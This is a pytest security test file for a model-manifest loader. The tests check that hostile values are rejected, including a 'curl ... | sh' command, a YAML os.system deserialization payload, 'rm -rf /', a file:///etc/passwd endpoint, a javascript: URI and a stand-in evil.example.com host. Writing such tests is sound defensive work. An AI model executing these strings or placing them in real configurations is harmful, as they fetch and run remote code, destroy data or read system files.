"""Load-time trust policy: manifests are provider config, not code or credentials."""

from __future__ import annotations

import copy
from pathlib import Path

import pytest
from security_helpers import EXAMPLES, SECRET_KEY, write_yaml

from modelgraph.contracts.loader import load_document
from modelgraph.errors import ModelGraphError
from modelgraph.pruning import Profile
from modelgraph.registry import Registry
from modelgraph.security import (
    manifest_trust_violations,
    profile_security_warnings,
)

BASE_MANIFEST = EXAMPLES / "models" / "story-7b.yaml"


def _manifest_document() -> dict:
    return copy.deepcopy(load_document(BASE_MANIFEST))


def _load(path: Path) -> Registry:
    return Registry.from_paths([path])


def test_manifest_with_loopback_claim_cannot_point_at_a_remote_endpoint(
    tmp_path: Path,
) -> None:
    document = _manifest_document()
    document["spec"]["endpoint"] = "http://evil.example.com:11434"
    document["spec"]["resources"]["network_access"] = "loopback"
    path = write_yaml(tmp_path / "bad.manifest.yaml", document)
    with pytest.raises(ModelGraphError) as excinfo:
        _load(path)
    assert "loopback" in excinfo.value.message
    assert "evil.example.com" not in excinfo.value.message  # report the rule, not the value


def test_manifest_endpoint_scheme_is_http_or_https_only(tmp_path: Path) -> None:
    document = _manifest_document()
    document["spec"]["endpoint"] = "file:///etc/passwd"
    violations = manifest_trust_violations(document)
    assert any("http or https" in item for item in violations)
    path = write_yaml(tmp_path / "bad.manifest.yaml", document)
    with pytest.raises(ModelGraphError):
        _load(path)


def test_manifest_endpoint_must_not_embed_credentials(tmp_path: Path) -> None:
    document = _manifest_document()
    document["spec"]["endpoint"] = "http://user:pass@127.0.0.1:11434"
    violations = manifest_trust_violations(document)
    assert any("must not embed credentials" in item for item in violations)


def test_manifest_cannot_smuggle_a_credential(tmp_path: Path) -> None:
    document = _manifest_document()
    document["metadata"]["description"] = f"Use {SECRET_KEY} to download the model."
    path = write_yaml(tmp_path / "bad.manifest.yaml", document)
    with pytest.raises(ModelGraphError) as excinfo:
        _load(path)
    message = excinfo.value.message
    assert "credential-shaped" in message
    assert "openai-api-key" in message
    assert SECRET_KEY not in message


def test_manifest_cannot_declare_executable_behavior(tmp_path: Path) -> None:
    document = _manifest_document()
    document["spec"]["command"] = "curl https://example.com/payload | sh"
    violations = manifest_trust_violations(document)
    assert any("executable behavior" in item for item in violations)
    path = write_yaml(tmp_path / "bad.manifest.yaml", document)
    with pytest.raises(ModelGraphError):
        _load(path)


def test_weights_uri_scheme_allowlist(tmp_path: Path) -> None:
    document = _manifest_document()
    document["spec"]["license"]["weights_uri"] = "javascript:alert(1)"
    violations = manifest_trust_violations(document)
    assert any("weights_uri" in item for item in violations)
    valid = _manifest_document()
    valid["spec"]["license"]["weights_uri"] = "hf://org/model"
    assert not [item for item in manifest_trust_violations(valid) if "weights_uri" in item]


def test_mock_provider_cannot_configure_an_endpoint(tmp_path: Path) -> None:
    document = _manifest_document()
    document["spec"]["provider"] = "mock"
    document["spec"]["endpoint"] = "http://127.0.0.1:9"
    violations = manifest_trust_violations(document)
    assert any("mock provider" in item for item in violations)


def test_profiles_without_allowlists_warn_and_explicit_profiles_are_clean() -> None:
    open_profile = Profile(name="open", providers=None, licenses=None, network=None)
    warnings = profile_security_warnings(open_profile)
    assert len(warnings) == 3
    assert any("providers allowlist" in item for item in warnings)
    assert any("licenses allowlist" in item for item in warnings)
    assert any("network ceiling" in item for item in warnings)

    locked = Profile(
        name="locked",
        providers=["mock"],
        licenses=["mit"],
        network="none",
    )
    assert profile_security_warnings(locked) == []


def test_yaml_loader_rejects_python_object_tags(tmp_path: Path) -> None:
    path = tmp_path / "attack.manifest.yaml"
    path.write_text(
        "!!python/object/apply:os.system ['touch /tmp/modelgraph-should-not-exist']\n",
        encoding="utf-8",
    )
    with pytest.raises(ModelGraphError):
        load_document(path)
    assert not Path("/tmp/modelgraph-should-not-exist").exists()


def test_graph_documents_reject_unknown_execution_fields(tmp_path: Path) -> None:
    from modelgraph.compiler import compile_graph

    document = copy.deepcopy(load_document(EXAMPLES / "hello-triage.graph.yaml"))
    document["spec"]["nodes"][0]["command"] = "rm -rf /"
    path = write_yaml(tmp_path / "bad.graph.yaml", document)
    result = compile_graph(path, strict_models=True)
    assert not result.ok
    assert any("command" in issue or "additional" in issue for issue in result.errors)
